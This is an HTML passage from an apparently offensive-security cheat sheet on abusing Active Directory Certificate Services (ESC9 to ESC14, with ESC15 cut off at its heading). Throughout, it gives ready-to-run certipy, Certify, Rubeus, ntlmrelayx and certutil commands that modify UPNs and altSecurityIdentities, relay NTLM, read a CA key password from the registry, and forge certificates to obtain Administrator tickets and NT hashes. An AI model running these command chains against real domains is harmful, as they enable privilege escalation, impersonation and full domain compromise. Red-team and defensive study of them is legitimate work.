<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a> is allowed to enroll in the certificate template ESC9 that specifies the <strong>CT_FLAG_NO_SECURITY_EXTENSION</strong> flag in the <strong>msPKI-Enrollment-Flag</strong> value.</p>
<ul>
<li>
<p>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-p</span> <span class="n">Passw0rd</span> <span class="n">-account</span> <span class="n">Jane</span>
</code></pre></div>
</li>
<li>
<p>Change the <strong>userPrincipalName</strong> of Jane to be Administrator. <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/26a0.svg" title=":warning:" /> leave the <code>@corp.local</code> part</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-password</span> <span class="n">Passw0rd</span> <span class="n">-user</span> <span class="n">Jane</span> <span class="n">-upn</span> <span class="n">Administrator</span>
</code></pre></div>
</li>
<li>
<p>Request the vulnerable certificate template ESC9 from Jane's account.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-username</span> <span class="n">jane</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-hashes</span> <span class="p">...</span> <span class="n">-ca</span> <span class="n">corp-DC-CA</span> <span class="n">-template</span> <span class="n">ESC9</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="c"># userPrincipalName in the certificate is Administrator </span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="c"># the issued certificate contains no &quot;object SID&quot;</span>
</code></pre></div>
</li>
<li>
<p>Restore userPrincipalName of Jane to <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#74;&#97;&#110;&#101;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">certipy</span> <span class="n">account</span> <span class="n">update</span> <span class="n">-username</span> <span class="n">John</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-password</span> <span class="n">Passw0rd</span> <span class="n">-user</span> <span class="n">Jane</span><span class="nv">@corp</span><span class="p">.</span><span class="n">local</span>
</code></pre></div>
</li>
<li>
<p>Authenticate with the certificate and receive the NT hash of the <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#65;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;">&#65;&#100;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#99;&#111;&#114;&#112;&#46;&#108;&#111;&#99;&#97;&#108;</a> user.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="n">certipy</span> <span class="n">auth</span> <span class="n">-pfx</span> <span class="n">administrator</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="c"># Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.</span>
</code></pre></div>
</li>
</ul>
<h2 id="esc11-relaying-ntlm-to-icpr">ESC11 - Relaying NTLM to ICPR</h2>
<blockquote>
<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.</p>
</blockquote>
<p>Requirements:</p>
<ul>
<li><a href="https://github.com/sploutchy/Certipy">sploutchy/Certipy</a> - Certipy fork</li>
<li><a href="https://github.com/sploutchy/impacket">sploutchy/impacket</a> - Impacket fork</li>
</ul>
<p>Exploitation:</p>
<ol>
<li>Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output</li>
<li>
<p>Setup a relay using Impacket ntlmrelay and trigger a connection to it.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">rpc</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-rpc-mode</span> <span class="n">ICPR</span> <span class="n">-icpr-ca-name</span> <span class="n">lab-DC-CA</span> <span class="n">-smb2support</span>
</code></pre></div>
</li>
</ol>
<h2 id="esc12-adcs-ca-on-yubihsm">ESC12 - ADCS CA on YubiHSM</h2>
<blockquote>
<p>The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.</p>
</blockquote>
<p><strong>Requirements</strong>:</p>
<ul>
<li>CA certificate</li>
<li>Shell access on the root CA server</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Generate a certicate for the user</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-target</span> <span class="n">dc-esc</span><span class="p">.</span><span class="n">esc</span><span class="p">.</span><span class="n">local</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="s2">&quot;user_esc12@esc.local&quot;</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-template</span> <span class="n">User</span> <span class="n">-ca</span> <span class="p">&lt;</span><span class="n">CA-Common-Name</span><span class="p">&gt;</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">certipy</span> <span class="n">cert</span> <span class="n">-pfx</span> <span class="n">user_esc12</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-nokey</span> <span class="n">-out</span> <span class="n">user_esc12</span><span class="p">.</span><span class="n">crt</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="n">certipy</span> <span class="n">cert</span> <span class="n">-pfx</span> <span class="n">user_esc12</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-nocert</span> <span class="n">-out</span> <span class="n">user_esc12</span><span class="p">.</span><span class="n">key</span>
</code></pre></div>
<ul>
<li>Importing the CA certificate into the user store</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">certutil</span> <span class="n">-addstore</span> <span class="n">-user</span> <span class="n">my</span> <span class="p">.\</span><span class="n">Root-CA</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">cer</span>
</code></pre></div>
<ul>
<li>Associated with the private key in the YubiHSM2 device</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">certutil</span> <span class="n">-csp</span> <span class="s2">&quot;YubiHSM Key Storage Provider&quot;</span> <span class="n">-repairstore</span> <span class="n">-user</span> <span class="n">my</span> <span class="p">&lt;</span><span class="n">CA-Common-Name</span><span class="p">&gt;</span>
</code></pre></div>
<ul>
<li>Sign <code>user_esc12.crt</code> and specify a <code>Subject Alternative Name</code> using the <code>extension.inf</code> file.</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">certutil</span> <span class="n">-sign</span> <span class="p">./</span><span class="n">user_esc12</span><span class="p">.</span><span class="n">crt</span> <span class="n">new</span><span class="p">.</span><span class="n">crt</span> <span class="nv">@extension</span><span class="p">.</span><span class="n">inf</span>
</code></pre></div>
<ul>
<li>Content of extension.inf</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="na">[Extensions]</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="mf">2.5.29.17</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;{text}&quot;</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="n">_continue_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;UPN=Administrator@esc.local&amp;&quot;</span>
</code></pre></div>
<ul>
<li>Use the certificate to get the TGT of the Administrator</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">openssl</span><span class="p">.</span><span class="n">exe</span> <span class="n">pkcs12</span> <span class="n">-export</span> <span class="n">-in</span> <span class="n">new</span><span class="p">.</span><span class="n">crt</span> <span class="n">-inkey</span> <span class="n">user_esc12</span><span class="p">.</span><span class="n">key</span> <span class="n">-out</span> <span class="n">user_esc12_Administrator</span><span class="p">.</span><span class="n">pfx</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">user_esc12_Administrator</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">esc</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span> <span class="p">/</span><span class="n">show</span> <span class="p">/</span><span class="n">nowrap</span>
</code></pre></div>
<p>Unlocking the YubiHSM with the plaintext password in the registry key: <code>HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword</code>.</p>
<h2 id="esc13-issuance-policy">ESC13 - Issuance Policy</h2>
<blockquote>
<p>If a principal (user or computer) has enrollment rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group link.</p>
</blockquote>
<p><strong>Requirements</strong></p>
<ul>
<li>The principal has enrollment rights on a certificate template</li>
<li>The certificate template has an issuance policy extension</li>
<li>The issuance policy has an OID group link to a group</li>
<li>The certificate template defines EKUs that enable client authentication</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nv">$ESC13Template</span> <span class="p">=</span> <span class="nb">Get-ADObject</span> <span class="s2">&quot;CN=ESC13Template,$TemplateContainer&quot;</span> <span class="n">-Properties</span> <span class="n">nTSecurityDescriptor</span> <span class="nv">$ESC13Template</span><span class="p">.</span><span class="n">nTSecurityDescriptor</span><span class="p">.</span><span class="n">Access</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-eq</span> <span class="s2">&quot;DUMPSTER\ESC13User&quot;</span><span class="p">}</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">AccessControlType</span>     <span class="p">:</span> <span class="n">Allow</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c"># check if there is an issuance policy in the msPKI-Certificate-Policy</span>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-ADObject</span> <span class="s2">&quot;CN=ESC13Template,$TemplateContainer&quot;</span> <span class="n">-Properties</span> <span class="n">msPKI-Certificate-Policy</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="n">msPKI-Certificate-Policy</span> <span class="p">:</span> <span class="p">{</span><span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">311</span><span class="p">.</span><span class="n">21</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">4571196</span><span class="p">.</span><span class="n">1884641</span><span class="p">.</span><span class="n">3293620</span><span class="p">.</span><span class="n">10686285</span><span class="p">.</span><span class="n">12068043</span><span class="p">.</span><span class="n">134</span><span class="p">.</span><span class="n">3651508</span><span class="p">.</span><span class="n">12319448</span><span class="p">}</span>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="c"># check for OID group link</span>
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-ADObject</span> <span class="s2">&quot;CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer&quot;</span> <span class="n">-Properties</span> <span class="n">DisplayName</span><span class="p">,</span><span class="n">msPKI-Cert-Template-OID</span><span class="p">,</span><span class="n">msDS-OIDToGroupLink</span>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="n">msDS-OIDToGroupLink</span>     <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">ESC13Group</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Groups</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Tier0</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">dumpster</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fire</span>
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="c"># verify if ESC13Group is a Universal group</span>
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-ADGroup</span> <span class="n">ESC13Group</span> <span class="n">-Properties</span> <span class="n">Members</span>
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="n">GroupScope</span>        <span class="p">:</span> <span class="n">Universal</span>
<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="n">Members</span>           <span class="p">:</span> <span class="p">{}</span>
</code></pre></div>
<p><strong>Exploitation</strong>:</p>
<ul>
<li>Find a vulnerable template</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">certipy</span> <span class="n">find</span> <span class="n">-target</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="s2">&quot;username&quot;</span> <span class="n">-p</span> <span class="s2">&quot;P@ssw0rd&quot;</span> <span class="n">-stdout</span> <span class="n">-vulnerable</span>
</code></pre></div>
<ul>
<li>Request a certificate for the vulnerable template</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="p">.\</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC01</span><span class="p">\</span><span class="n">dumpster-DC01-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">ESC13Template</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-target</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="s2">&quot;username&quot;</span> <span class="n">-p</span> <span class="s2">&quot;P@ssw0rd&quot;</span> <span class="n">-template</span> <span class="p">&lt;</span><span class="n">ESC13-Template</span><span class="p">&gt;</span> <span class="n">-ca</span> <span class="p">&lt;</span><span class="n">CA-NAME</span><span class="p">&gt;</span>
</code></pre></div>
<ul>
<li>Merge into a PFX file</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="n">certutil</span> <span class="n">-MergePFX</span> <span class="p">.\</span><span class="n">esc13</span><span class="p">.</span><span class="n">pem</span> <span class="p">.\</span><span class="n">esc13</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
<ul>
<li>Verify the presence of the "Client Authentication" and the "Policy Identifier"</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">certutil</span> <span class="n">-Dump</span> <span class="n">-v</span> <span class="p">.\</span><span class="n">esc13</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
<ul>
<li>Pass-The-Certificate: Ask a TGT for our user, but we are also member of the linked group and inherited their privileges</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">ESC13User</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">esc13</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">nowrap</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">username</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">username</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc</span> <span class="p">/</span><span class="n">nowrap</span>
</code></pre></div>
<ul>
<li>Pass-The-Ticket: Use the ticket that grant privileges from the AD group</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">ticket</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="esc14-altsecurityidentities">ESC14 - altSecurityIdentities</h2>
<blockquote>
<p>ESC14 is an Active Directory Certificate Services (ADCS) abuse technique that leverages the altSecurityIdentities attribute to perform explicit certificate mappings. This attribute allows administrators to associate specific certificates with user or computer accounts for authentication purposes. However, if an attacker gains write access to this attribute, they can add a mapping to a certificate they control, effectively impersonating the targeted account.</p>
</blockquote>
<p>Domain administrators can manually associate certificates with a user in Active Directory by configuring the altSecurityIdentities attribute of the user object. This attribute supports six different values, categorized into three weak (insecure) mappings and three strong mappings.</p>
<p>In general, a mapping is considered strong if it relies on unique, non-reusable identifiers. Conversely, mappings based on usernames or email addresses are classified as weak, as these identifiers can be easily reused or changed.</p>
<table>
<thead>
<tr>
<th>Mapping</th>
<th>Example</th>
<th>Type</th>
<th>Remarks</th>
</tr>
</thead>
<tbody>
<tr>
<td>X509IssuerSubject</td>
<td><code>X509:&lt;I&gt;IssuerName&lt;S&gt;SubjectName</code></td>
<td>Weak</td>
<td>/</td>
</tr>
<tr>
<td>X509SubjectOnly</td>
<td><code>X509:&lt;S&gt;SubjectName</code></td>
<td>Weak</td>
<td>/</td>
</tr>
<tr>
<td>X509RFC822</td>
<td><code>X509:&lt;RFC822&gt;user@contoso.com</code></td>
<td>Weak</td>
<td>Email Address</td>
</tr>
<tr>
<td>X509IssuerSerialNumber</td>
<td><code>X509:&lt;I&gt;IssuerName&lt;SR&gt;1234567890</code></td>
<td>Strong</td>
<td>Recommended</td>
</tr>
<tr>
<td>X509SKI</td>
<td><code>X509:&lt;SKI&gt;123456789abcdef</code></td>
<td>Strong</td>
<td>/</td>
</tr>
<tr>
<td>X509SHA1PublicKey</td>
<td><code>X509:&lt;SHA1-PUKEY&gt;123456789abcdef</code></td>
<td>Strong</td>
<td>/</td>
</tr>
</tbody>
</table>
<p><strong>Requirements</strong>:</p>
<ul>
<li>Ability to modify the attribute <code>altSecurityIdentitites</code> of an account.</li>
</ul>
<p><strong>Exploitation</strong>:</p>
<p><strong>Technique 1</strong> with <a href="https://github.com/GhostPack/Certify">GhostPack/Certify</a> and <a href="https://github.com/logangoins/Stifle">logangoins/Stifle</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c"># the certificate requested must be a machine account certificate</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">request</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">lan</span><span class="p">\</span><span class="n">lab-dc01-ca</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">Machine</span> <span class="p">/</span><span class="n">machine</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c"># convert to base64 .pfx format:</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="n">-in</span> <span class="n">cert</span><span class="p">.</span><span class="n">pem</span> <span class="n">-keyex</span> <span class="n">-CSP</span> <span class="s2">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="n">-export</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-w</span> <span class="n">0</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="c"># generate a certificate mapping string and write it to the target objects altSecurityIdentities attribute:</span>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="n">Stifle</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="p">/</span><span class="n">object</span><span class="p">:</span><span class="n">target</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">MIIMrQI</span><span class="p">...</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">P</span><span class="nv">@ssw0rd</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="c"># request a TGT using PKINIT authentication, effectively impersonating the target user with Rubeus:</span>
<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">target</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">MIIMrQI</span><span class="p">...</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">P</span><span class="nv">@ssw0rd</span>
</code></pre></div>
<p><strong>Technique 2</strong> using <a href="https://github.com/Deloitte-OffSecResearch/Certipy">Deloitte-OffSecResearch/Certipy</a> and <a href="https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1">JonasBK/Add-AltSecIDMapping.ps1</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c"># request a machine account certificate</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">addcomputer</span><span class="p">.</span><span class="n">py</span> <span class="n">-method</span> <span class="n">LDAPS</span> <span class="n">-computer-name</span> <span class="s1">&#39;ESC13$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-dc-host</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="s1">&#39;lab.local/kuma&#39;</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="n">certipy</span> <span class="n">req</span> <span class="n">-target</span> <span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">-u</span> <span class="s2">&quot;ESC13$@lab.local&quot;</span> <span class="n">-p</span> <span class="s1">&#39;P@ssw0rd&#39;</span> <span class="n">-template</span> <span class="n">Machine</span> <span class="n">-ca</span> <span class="n">LAB-CA</span>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c"># extract Serial Number and Issuer, to configure a strong mapping</span>
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="n">certutil</span> <span class="n">-Dump</span> <span class="n">-v</span> <span class="p">.\</span><span class="n">esc13</span><span class="p">.</span><span class="n">pfx</span>
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="nb">Get-X509IssuerSerialNumberFormat</span> <span class="n">-SerialNumber</span> <span class="s2">&quot;&lt;serial-number&gt;&quot;</span> <span class="n">-IssuerDistinguishedName</span> <span class="s2">&quot;&lt;issuer-cn&gt;&quot;</span>
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>
<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="c"># add mapping to the Administrator user</span>
<a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a><span class="nb">Add-AltSecIDMapping</span> <span class="n">-DistinguishedName</span> <span class="s2">&quot;CN=Administrator,CN=Users,DC=lab,DC=local&quot;</span> <span class="n">-MappingString</span> <span class="s2">&quot;&lt;output-x509-issuer-serial-number&gt;&quot;</span>
<a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>
<a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a><span class="c"># request TGT for Administrator</span>
<a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">esc13</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">show</span> <span class="p">/</span><span class="n">nowrap</span>
</code></pre></div>
<h2 id="esc15-ekuwu-application-policies-cve-2024-49019">ESC15 - EKUwu Application Policies - CVE-2024-49019</h2>
<p>This technique now has a CVE number and was patched on November 12, See <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019">Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019</a> for more information.</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li><strong>Template Schema</strong> Version 1</li>
<li><strong>ENROLLEE_SUPPLIES_SUBJECT</strong> = <code>True</code></li>
</ul>
<p><strong>Exploitation</strong>:</p>
